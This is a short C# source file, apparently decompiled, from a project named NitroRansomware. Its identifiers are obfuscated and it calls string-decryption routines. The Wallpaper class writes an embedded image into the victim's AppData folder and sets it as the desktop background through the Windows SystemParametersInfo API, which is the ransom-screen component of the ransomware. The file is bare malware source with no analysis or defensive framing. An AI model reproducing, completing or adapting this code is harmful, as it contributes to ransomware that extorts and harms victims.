using System;
using System.Drawing;
using System.Runtime.InteropServices;
using NitroRansomware.Properties;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace NitroRansomware;

internal class Wallpaper
{
	private static uint SPI_SETWALL;

	private static uint SPIF_UPDATE;

	private static uint SPIF_SWEDWINI;

	private static string fileName;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern int SystemParametersInfo(uint uAction, int uParam, string lpvParam, uint fuWinIni);

	public static void ChangeWallpaper()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		fileName = folderPath + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5408);
		((Image)Resources.wl).Save(fileName);
		SystemParametersInfo(SPI_SETWALL, 0, fileName, SPIF_UPDATE | SPIF_SWEDWINI);
	}

	public Wallpaper()
	{
		hHEYokUTtehNq5ji0d.LQgF529zBT6Ox();
		base._002Ector();
	}

	static Wallpaper()
	{
		WP6RZJql8gZrNhVA9v.iXLoKRSpAw();
		hHEYokUTtehNq5ji0d.LQgF529zBT6Ox();
		SPI_SETWALL = 20u;
		SPIF_UPDATE = 1u;
		SPIF_SWEDWINI = 2u;
	}
}
